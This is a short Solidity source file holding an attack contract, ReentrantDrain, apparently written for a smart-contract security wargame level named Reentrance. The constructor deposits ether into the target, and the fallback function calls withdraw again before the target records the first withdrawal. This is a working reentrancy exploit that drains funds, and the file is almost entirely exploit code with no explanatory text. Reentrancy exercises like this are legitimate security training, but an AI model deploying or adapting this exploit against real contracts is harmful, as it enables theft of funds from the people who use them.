pragma solidity ^0.6.12;
//Convert Contract to interface to eliminate import dependences
interface Reentrance {
  

    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external  ;
}

contract ReentrantDrain {
    Reentrance _target;
    address admin;
    bool done;

    constructor(address tar) public payable {
        admin = msg.sender;
        _target = Reentrance(tar);
        _target.donate{value: msg.value}(address(this));
    }

    function drain() public {
        _target.withdraw(0.001 ether);
    }

    fallback() external payable {
        if (!done) {
            done = true;
      _target.withdraw(0.001 ether);
        }
      
    }
}
